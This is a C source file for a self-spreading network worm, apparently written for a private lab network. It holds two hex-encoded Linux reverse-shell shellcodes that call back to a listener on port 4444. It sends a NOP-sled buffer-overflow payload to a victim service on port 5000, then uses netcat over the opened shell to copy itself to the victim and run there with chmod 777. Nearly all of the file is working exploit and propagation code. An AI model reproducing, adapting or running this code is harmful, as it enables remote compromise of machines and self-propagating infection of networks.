#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>

//generate 2 shellcode with different IP address
char shellcode1[] = "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
                    "\x06\x51\xb1\x01\x51\xb1\x02\x51"
                    "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
                    "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
                    //"\xB8\x1B\x40\x11\x17\x35\x11\x11\x11\x11\x50\x31\xC0"
                    "\x68\xC0\xA8\xFD\x87\x66\x68\x11\x5C"
                    "\xb1\x02\x66\x51\x89\xe7\xb3"
                    "\x10\x53\x57\x52\x89\xe1\xb3\x03"
                    "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
                    "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
                    "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
                    "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
                    "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
                    "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
                    "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
                    "\x2f\x62\x69\x89\xe3\x50\x53\x89"
                    "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
                    "\x01\xcd\x80";

char shellcode2[] = "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
                    "\x06\x51\xb1\x01\x51\xb1\x02\x51"
                    "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
                    "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
                    //"\xB8\x1B\x40\x11\x16\x35\x11\x11\x11\x11\x50\x31\xC0"
                    "\x68\xC1\xA8\xFD\x87\x66\x68\x11\x5C"
                    "\xb1\x02\x66\x51\x89\xe7\xb3"
                    "\x10\x53\x57\x52\x89\xe1\xb3\x03"
                    "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
                    "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
                    "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
                    "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
                    "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
                    "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
                    "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
                    "\x2f\x62\x69\x89\xe3\x50\x53\x89"
                    "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
                    "\x01\xcd\x80";

// standard offset (probably must be modified)
#define RET 0xffffcd3b
#define BUFFER_SIZE 1024
#define NAME_SIZE 2048
#define BUF_SIZE 1064

// global variables
struct sockaddr_in my_srv;
char buffer[1024];
int signal = 0;
char *ip_victim;
int socket_server;

// exploit function to send buffer to victim
int Exploit(char *ip_victim, int port_victim)
{
    // declare variables
    printf("finish declare variables\n");
    char exploit_buffer[BUF_SIZE];
    int s, i, size;
    struct hostent *host;
    struct sockaddr_in remote;

    // filling buffer with NOPs
    printf("generating exploit buffer\n");
    memset(exploit_buffer, 0x90, BUF_SIZE);

    if (signal == 1)
    {
        memcpy(exploit_buffer + 900 - sizeof(shellcode1), shellcode1, sizeof(shellcode1) - 1);
    }
    else
    {
        memcpy(exploit_buffer + 900 - sizeof(shellcode2), shellcode2, sizeof(shellcode2) - 1);
    }

    printf("finish copying shellcode\n");

    // Copying the return address multiple times at the end of the buffer...

    printf("adding return address\n");
    for (i = 901; i < BUF_SIZE - 4; i += 4)
    {
        *((int *)&exploit_buffer[i]) = RET;
    }
    exploit_buffer[BUF_SIZE - 1] = 0x0;
    printf("finish adding return address\n");

    printf("create hostname\n");

    // getting hostname
    host = gethostbyname(ip_victim);

    printf("create socket\n");
    // creating socket...
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    {
        fprintf(stderr, "Error: Socket\n");
        return -1;
    }

    // create remote
    printf("create remote\n");

    // state Protocolfamily , then converting the hostname or IP address, and getting  port number
    remote.sin_family = AF_INET;
    remote.sin_addr = *((struct in_addr *)host->h_addr);
    remote.sin_port = htons(port_victim);
    printf("connect to remote\n");

    // connecting with destination host
    if (connect(s, (struct sockaddr *)&remote, sizeof(remote)) == -1)
    {
        close(s);
        fprintf(stderr, "Error: connect\n");
        return -1;
    }
    printf("send exploit buffer\n");

    // sending exploit string
    size = send(s, exploit_buffer, sizeof(exploit_buffer), 0);
    if (size == -1)
    {
        close(s);
        fprintf(stderr, "sending data failed\n");
        return -1;
    }
    // closing socket
    close(s);
    return 1;
}

void CheckSocketServer()
{
    // create socket server
    socket_server = socket(AF_INET, SOCK_STREAM, 0);

    // check if socket is created
    if (socket_server < 0)
    {
        fprintf(stderr, "Error: Socket\n");
        return;
    }
}

void CheckMySrv()
{
    // create my_srv
    my_srv.sin_family = AF_INET;
    my_srv.sin_addr.s_addr = INADDR_ANY;
    my_srv.sin_port = htons(4444);

    // bind socket to port 4444
    if (bind(socket_server, (struct sockaddr *)&my_srv, sizeof(my_srv)) == -1)
    {
        perror("Error: bind");
        return;
    }
    // listen to port 4444
    if (listen(socket_server, 3) == -1)
    {
        perror("Error: listen");
        return;
    }
}

void *Listen()
{
    // listen to port 4444
    printf("Listening port 4444\n");

    // check socket server
    CheckSocketServer();
    CheckMySrv();

    // announce finish listen
    printf("finish listen\n");
}

// send worm to victim using netcat
void NetCatSendWorm(int client, int byte_size)
{
    // infection announcement
    printf("Starting connect from victim\n");

    // sending shellcode
    memcpy(buffer, "pwd\x0A", 5);
    byte_size = send(client, buffer, 5, 0);

    if (byte_size < 0)
    {
        return;
    }
    byte_size = recv(client, buffer, sizeof(buffer), 0);
    if (byte_size < 0)
    {
        return;
    }
    buffer[byte_size - 1] = 0;

    // get into dir
    printf("Starting the infection\n");
    //sleep(10);

    // send worm
    memcpy(buffer, "nc -l 10000 >c3\x0A", 17);
    byte_size = send(client, buffer, 17, 0);

    printf("Sending the worm to exploit the machine\n");

    // send worm
    sprintf(buffer, "nc %s 10000 <c3\x0A", ip_victim);
    system(buffer);

    // chmod 777
    memcpy(buffer, "chmod 777 c3\x0A", 14);
    byte_size = send(client, buffer, 14, 0);

    // execute
    memcpy(buffer, "./c3\x0A", 6);
    byte_size = send(client, buffer, 6, 0);
}

// infecting function to send buffer to victim
void *Infect(void *ptr)
{

    // declare variables
    int byte_size, client, client_size;
    struct sockaddr_in cli_struct;

    // announce infection
    printf("Start infecting the machine\n");

    // creating socket
    client = accept(socket_server, (struct sockaddr *)&cli_struct, &client_size);
    if (client == -1)
    {
        perror("Error: accept");
        return;
    }

    // netcat send worm
    NetCatSendWorm(client, byte_size);

    // close
    close(client);
}

int main(int argc, char *argv[])
{
    // declare variables
    pthread_t action_thread_1, action_thread_2;
    int independent_thread;

    // getting victim IP address
    if (argc > 1)
    {
        //.0.7
        signal = 1;
        ip_victim = argv[1];
    }
    else
    {
        //.0.8
        ip_victim = "192.168.253.137";
    }

    // create thread to listen to port 4444
    independent_thread = pthread_create(&action_thread_1, NULL, Listen, NULL);

    // exploit the victim
    if (Exploit(ip_victim, 5000))
    {
        // announce success
        printf("The Exploitation succeeded\n");

        // create thread to infect the victim
        independent_thread = pthread_create(&action_thread_2, NULL, Infect, NULL);

        // wait for thread to finish
        pthread_join(action_thread_2, NULL);

        // announce finish
        printf("Finished\n");
        
        return 0;
    }
    else
    {
        printf("The Exploitation failed\n");
    }
    return 0;
}
